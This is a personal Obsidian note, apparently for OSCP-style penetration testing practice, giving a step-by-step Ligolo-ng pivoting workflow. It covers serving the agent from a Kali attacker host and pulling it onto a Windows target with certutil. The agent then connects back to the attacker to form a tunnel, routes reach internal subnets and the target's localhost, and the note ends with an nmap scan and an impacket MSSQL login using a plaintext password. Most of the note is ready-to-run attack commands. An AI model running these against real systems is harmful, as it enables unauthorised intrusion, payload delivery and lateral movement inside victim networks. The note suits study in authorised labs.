[[Sending payload reverse direction through ligolo pivot]]

Listener_list
Listener_stop

```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

KILL LIGOLO
```
sudo ip link delete ligolo
```
## 🔹 Step 0 — Identify Architecture

### Linux

```
uname -m
```

- `x86_64` → amd64
- `aarch64` → arm64
### Windows

**CMD**

```cmd
powershell $env:PROCESSOR_ARCHITECTURE
```

**PowerShell**

```powershell
$env:PROCESSOR_ARCHITECTURE
```

> ⚠️ Always match **agent/proxy binary architecture** to the target.


[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2)

---
# Step 2 & 3 in KALI ATTACKER

## 🔹 Step 2 — Create the TUN interface and bring it up:

```
sudo ip tuntap add user kali mode tun ligolo && sudo ip link set dev ligolo up
```

## 🔹 Step 3 — Start the Ligolo proxy server

- **Attacker (Kali)** → `proxy`
- **Target (Pivot host)** → `agent`

```
cd ~/Desktop/Tools/Ligolo/ && ./proxy -laddr 0.0.0.0:11601 -selfcert
```

---
### ⚠️ Error: Device or resource busy

If you see:

`ioctl(TUNSETIFF): Device or resource busy`

Fix:

`ip a | grep ligolo sudo ip link set ligolo up`

Or reset:

KILL LIGOLO
```
sudo ip link delete ligolo
```

```
 sudo ip tuntap add user kali mode tun ligolo 
```
 
```
sudo ip link set ligolo up
```

> ℹ️ TUN interface only needs to be created **once per reboot**

---
## 🔹 Step 4 — Execute agent in TARGET


On KALI ATTACKER
```
python -m http.server 80 --directory ~/Desktop/Tools/Ligolo/Agent
```

- `x86_64` → amd64
- `aarch64` → arm64

Contains

Windows
1. WindowsAMD64Agent.exe
2. WindowsARM64Agent.exe
Linux
3. LinuxAMD64Agent
4. LinuxARM64Agent

Transfer agent.exe onto target > Outfile agent.exe

Windows AMD64 > WindowsAMD64Agent.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/WindowsAMD64Agent.exe agent.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Execute agent in target shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\agent.exe -connect ${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

If restricted egress:

CMD
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\agent.exe -connect https://${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

Expected output:

![[Pasted image 20260913102354.png]]

![[Pasted image 20260913102406.png]]

`[INFO] Agent connected from 10.129.42.56... session`

Leave this running.

---
## 🔹 Step 5 — Establish the Tunnel & Route Traffic

In the Ligolo proxy interface:

```
session
```

Type `1` to select the agent session, then type `start`:

In a new Kali terminal, route the internal network interface (typically `10.129.42.0/24` or loopback `127.0.0.1/32` for local development servers) through your `ligolo` interface:

Based off this : 
`[INFO] Agent connected from 10.129.42.56... session`
F
or

Inside Ligolo console:

```
ifconfig
```

Look for internal TARGET subnet (e.g. `172.16.5.0/23`)

in KALI TERMINAL, Add specific IP route

REMEMBER to turn 10.10.10.X into 0 due to /24 subnet so 10.10.10.0
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ip route add ${ip}/24 dev ligolo`;

dv.paragraph("```bash\n" + command + "\n```");
```
Verify:
```
ip route list
```

```
ip route get [targetIP]
```

Fix : Delete route
```
sudo ip route del 10.129.42.0/24 dev ligolo
```


---

## 🔹 Step 9 — Verify Pivot

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ping ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
If ping works → pivot is **fully functional** ✅

---

## **Access to agent’s local ports (127.0.0.1):**

If you need to access the local ports of the currently connected agent, there’s a “magic” CIDR hardcoded in Ligolo-ng: _240.0.0.0/4_ (This is an unused IPv4 subnet). If you query an IP address on this subnet, Ligolo-ng will automatically redirect traffic to the agent’s local IP address (127.0.0.1).

Now, back to your kali machine run this to do port forwarding.

```dataviewjs
const command = "sudo ip route add 240.0.0.1/32 dev ligolo";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```

Enumerate localhost ports
```dataviewjs
const command = "nmap 240.0.0.1 -sCV";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```

Access future local port services with 240.0.0.1
```dataviewjs
const command = "impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth -p 1433";

const button = dv.container.createEl("button", {
    text: command
});

button.style.cssText = `
    font-family: monospace;
    font-size: 0.85em;
    padding: 2px 6px;
    border: 1px solid var(--background-modifier-border);
    border-radius: 4px;
    background: var(--code-background);
    color: var(--text-normal);
    cursor: pointer;
`;

button.addEventListener("click", async () => {
    await navigator.clipboard.writeText(command);
    button.textContent = "Copied!";
    setTimeout(() => button.textContent = command, 1000);
});
```